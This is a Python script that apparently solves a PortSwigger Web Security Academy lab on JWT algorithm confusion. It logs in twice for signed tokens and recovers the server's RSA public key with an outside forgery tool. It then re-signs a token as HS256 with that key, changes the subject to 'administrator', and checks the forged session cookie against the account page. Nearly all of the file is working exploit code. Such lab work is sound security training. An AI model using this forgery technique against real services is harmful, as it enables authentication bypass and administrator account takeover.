import base64
import http.client
import json
import os
import re
import ssl
import time
import urllib.parse

import jwt as pyjwt
from cryptography.hazmat.primitives._serialization import Encoding
from cryptography.hazmat.primitives._serialization import PublicFormat
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

LAB_ID = '???'


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_myaccount(
        session: str,
        username: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/my-account'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('id', username),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def login_csrf() -> str:
    response = GET_login()
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return csrf


def login_session() -> str:
    csrf = login_csrf()
    response = POST_login(csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9._-]+);', cookie_header)[0]


jwt = login_session()

time.sleep(1)
jwt2 = login_session()

jwt_filename = "jwt.temp"
jwt_file = open(jwt_filename, "w")
jwt_file.writelines([jwt, jwt2])
jwt_file.close()
print()
print("jwts:")
print(jwt)
print(jwt2)
print()
print("compute public key using commands:")
print("git clone git@github.com:silentsignal/rsa_sign2n.git")
print("python3 -m venv rsa_sign2n/venv")
print("source rsa_sign2n/venv/bin/activate")
print("pip install -r rsa_sign2n/standalone/requirements.txt")
print(f"cd rsa_sign2n/standalone")
print(f'python3 jwt_forgery.py "{jwt}" "{jwt2}"')

pem_filename = input("input generated public key x509 PEM filename and hit enter: ")
with open(f"rsa_sign2n/standalone/{pem_filename}", "r") as pem_file:
    pub_key = pem_file.read()

print("pub key:")
print(pub_key)
print()

jwt_header = json.loads(base64.b64decode(jwt.split('.')[0] + '=='))
jwt_header["alg"] = "HS256"

jwt_payload = json.loads(base64.b64decode(jwt.split('.')[1] + '=='))
jwt_payload['sub'] = 'administrator'

hacked_jwt = pyjwt.encode(
    jwt_payload,
    pub_key,
    headers=jwt_header,
)
print(hacked_jwt)
response = GET_myaccount(session=hacked_jwt, username='administrator')
if response.status == 302 and response.headers['location'] == '/login':
    print("incorrect hacked token")
    exit(1)
print(f"response status: {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print()
print("hacked token trial successful!")
print("session cookie to copy:")
print(hacked_jwt)
